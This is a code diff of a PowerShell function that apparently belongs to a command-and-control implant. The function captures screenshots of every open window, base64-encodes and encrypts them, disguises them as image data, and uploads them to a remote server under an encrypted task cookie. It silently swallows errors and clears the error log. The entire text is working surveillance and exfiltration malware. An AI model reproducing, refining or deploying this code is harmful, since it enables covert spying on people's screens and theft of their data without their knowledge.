@@ -1,4 +1,4 @@
-function Get-ScreenshotAllWindows {
+function Get-Screenshot-AllWindows {
 
     param(
         [string] $TaskId
@@ -11,21 +11,22 @@ function Get-ScreenshotAllWindows {
         $assembly = [System.Reflection.Assembly]::Load($dllbytes)
     }
 
-	$processes = Get-Process
-	foreach ($p in $processes)
-	{
-		try {
-		   	[IntPtr] $windowHandle = $p.MainWindowHandle;
-			$msimage = New-Object IO.MemoryStream
+    $processes = Get-Process
+    foreach ($p in $processes)
+    {
+        try {
+            [IntPtr] $windowHandle = $p.MainWindowHandle;
+            $msimage = New-Object IO.MemoryStream
             $bitmap = [WindowStation]::Capture($windowHandle);
-			$bitmap.save($msimage, "png")
-            $b64 = [Convert]::ToBase64String($msimage.toarray())
+            $bitmap.save($msimage, "png")
+            $Output = [Convert]::ToBase64String($msimage.toarray())
             $bitmap.Dispose();
+            $Output = Encrypt-CompressedString $key $Output
+            $UploadBytes = getimgdata $Output
             $eid = Encrypt-String $key $TaskId
-            $send = Encrypt-String2 $key $b64
-            $UploadBytes = getimgdata $send
             (Get-Webclient -Cookie $eid).UploadData("$Server", $UploadBytes)|out-null
-		} catch {}
-	}
+
+        } catch {}
+    }
     $error.clear()
 }
